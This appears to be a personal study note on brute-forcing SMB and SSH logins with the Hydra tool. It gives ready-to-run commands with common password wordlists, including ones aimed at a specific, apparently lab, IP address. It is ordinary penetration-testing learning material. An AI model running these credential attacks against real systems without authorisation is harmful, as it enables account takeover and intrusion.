---
share: true
---
```markdown
# Note: Brute-Forcing Logins with Hydra

## What is Hydra?

- **Hydra** is a powerful tool for brute-forcing login credentials on various network services (SSH, SMB, FTP, HTTP, etc.).
- Supports both single and multiple usernames/passwords.

## Basic Syntax

```bash
hydra -l [login] -P [passwordlist] [service]://[ip] -t [threads]
```

- `-l`: Single username
- `-L`: File with a list of usernames
- `-P`: File with a list of passwords
- `-t`: Number of parallel threads (default is 16)
- `[service]`: Protocol/service (e.g., ssh, smb, ftp)
- `[ip]`: Target IP address

## Examples

### 1. Brute-Force SMB with NTLMV2

```bash
hydra -l [login] -P /usr/share/seclists/Discovery/Web-Content/Passwords.fuzz.txt -s 445 -t 4 smb://[ip] -m "NTLMV2"
```

- `-s 445`: Specify SMB port
- `-m "NTLMV2"`: Use NTLMv2 authentication

### 2. Brute-Force SSH with a Single Username

```bash
hydra -l [login] -P /usr/share/wordlists/rockyou.txt 10.82.134.129 ssh -t 4
```

### 3. Brute-Force SSH with a List of Usernames

```bash
hydra -L ./locks.txt -P /usr/share/wordlists/rockyou.txt 10.82.134.129 ssh -t 4
```

### 4. Brute-Force SSH with a Custom Password List

```bash
hydra -l [login] -P /home/augustrain/task.txt ssh://[ip] -t 4
```

## Tips

- Use `-L` for a file with multiple usernames.
- Use `-P` for a file with multiple passwords.
- Adjust `-t` (threads) for speed vs. stability.
- Always use appropriate and legal wordlists.

---

**Summary:**  
Hydra is a versatile tool for brute-forcing credentials on many services.  
Use `-l`/`-L` for usernames, `-P` for passwords, and specify the service and target IP.